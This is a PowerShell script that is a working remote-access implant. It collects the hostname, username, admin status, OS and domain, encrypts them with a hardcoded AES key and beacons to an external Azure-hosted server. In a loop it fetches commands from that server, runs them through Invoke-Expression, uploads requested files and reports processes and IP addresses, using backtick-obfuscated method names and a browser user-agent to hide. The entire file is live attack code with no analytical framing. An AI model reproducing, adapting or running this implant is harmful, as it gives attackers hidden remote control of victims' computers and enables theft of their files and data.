$TSK_CHK = 4;
$FUNNY = "T0NOR1RSQ0hSVFlLRVVUVEVSWVRFSkRCTElYVE9NUlU=";
$FUNNY_DRIP = "WElBS0tQRVlCRENMTFpFUg=="

[Net.WebRequest]::DefaultWebProxy = [Net.WebRequest]::GetSystemWebProxy()
[Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials

function Create-NiceObject($FUNNY, $FUNNY_DRIP) {
    $UWDATWDF = New-Object "System.Security.Cryptography.AesManaged"
    $UWDATWDF.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $UWDATWDF.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $UWDATWDF.BlockSize = 128
    $UWDATWDF.KeySize = 256
    if ($FUNNY_DRIP) {
        if ($FUNNY_DRIP.getType().Name -eq "String") {
            $UWDATWDF.IV = [System.Convert]::FromBase64String($FUNNY_DRIP)
        }
        else {
            $UWDATWDF.IV = $FUNNY_DRIP
        }
    }
    if ($FUNNY) {
        if ($FUNNY.getType().Name -eq "String") {
            $UWDATWDF.Key = [System.Convert]::FromBase64String($FUNNY)
        }
        else {
            $UWDATWDF.Key = $FUNNY
        }
    }
    $UWDATWDF
}

function MagicOne($FUNNY, $FUNNY_DRIP, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $UWDATWDF = Create-NiceObject $FUNNY $FUNNY_DRIP
    $BHKDETWXI = $UWDATWDF.CreateEncryptor()
    $encryptedData = $BHKDETWXI.TransformFinalBlock($bytes, 0, $bytes.Length);
    [Convert]::ToBase64String($encryptedData)
}

function MagicTwo($FUNNY, $FUNNY_DRIP, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $UWDATWDF = Create-NiceObject $FUNNY $FUNNY_DRIP
    $decryptor = $UWDATWDF.CreateDecryptor();
    $BN = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [Text.Encoding]::UTF8.GetString($BN).Trim([char]0)
}


$progPref = 'silentlyContinue';
$TempCl = "Net.WebClient"
#$TempCl.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;
#$WebPoxy = "Net.WebProxy"
#$WebPoxy = New-Object $TempCD("http://localhost:81", $true);
#$WebPoxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;
$web1 = New-Object $TempCl;
$web2 = New-Object $TempCl;
$webr = New-Object $TempCl;
#$web1.Proxy = [Net.WebRequest]::$WebPoxy;
#$web2.Proxy = [Net.WebRequest]::$WebPoxy;
#$webr.Proxy = [Net.WebRequest]::$WebPoxy;
$hostname = $env:COMPUTERNAME;
$DQ = MagicOne $FUNNY $FUNNY_DRIP $hostname
$chaotic = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $chaotic;
$urname = "$hostname-$r2";
$whoisit = $env:USERNAME;
$whmenc = MagicOne $FUNNY $FUNNY_DRIP $whoisit
$arch44 = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$opop = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch44)";
$dadom = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$whoisit = $whoisit + "*"
}

$raw_header = "$urname,$whoisit,$opop,$pnid,$dadom";
$encrypted_header = MagicOne $FUNNY $FUNNY_DRIP $raw_header;
$final_hostname_encrypted = MagicOne $FUNNY $FUNNY_DRIP $urname

$webh = $web1.headers;
$webh.add("Authorization", $encrypted_header);
$webh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");

$web1."d`OWnlO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/heartbeat");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $web2."d`OWnlO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/streaming/$urname");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    $final_command = MagicTwo $FUNNY $FUNNY_DRIP $command_raw
    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)

    if($fc -eq "False"){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = MagicOne $FUNNY $FUNNY_DRIP $ps
      $webrh = $webr.Headers;
      $webrh.add("Authorization", $pst);
      $webrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
      $webrh.add("X-Token", $DQ);
      $webr."d`OWnlO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/report");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = MagicOne $FUNNY $FUNNY_DRIP $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $XOIXL = [Convert]::ToBase64String($file_content);
        $efc = MagicOne $FUNNY $FUNNY_DRIP $XOIXL;
        $web3 = new-object $TempCl;
#        $TempCl.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;
#		$web3.Proxy = [Net.WebRequest]::$WebPoxy;
        $web3h = $web3.Headers;
        $web3h.add("Content-Type", "application/x-www-form-urlencoded");
        $web3h.add("X-Authorization", $whmenc);
        $web3."U`plO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/ping", "js=$filename&amp;token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{

        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $XOIXL = MagicOne $FUNNY $FUNNY_DRIP $ec;
        $web3 = New-Object $TempCl;
        $TempCl.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;

#		$web3.Proxy = [Net.WebRequest]::$WebPoxy;
        $web3.Headers["X-Token"] = $final_hostname_encrypted;
        $web3.Headers["Authorization"] = $XOIXL;
        $web3.Headers["Session"] = $command_raw;
        $web3."d`OWnlO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/chat");
    } else{
      try{
        $ec = Invoke-Expression ($fc) | Out-String;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $XOIXL = MagicOne $FUNNY $FUNNY_DRIP $ec;
        $web3 = New-Object $TempCl;
#		$web3.Proxy = [Net.WebRequest]::$WebPoxy;
#        $TempCl.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;
        $web3.Headers["X-Token"] = $final_hostname_encrypted;
        $web3.Headers["Authorization"] = $XOIXL;
        $web3.Headers["Session"] = $command_raw;
        $web3."d`OWnlO`ADString"("http://ragavan.japaneast.cloudapp.azure.com:80/chat");
    }

    sleep $TSK_CHK;
    }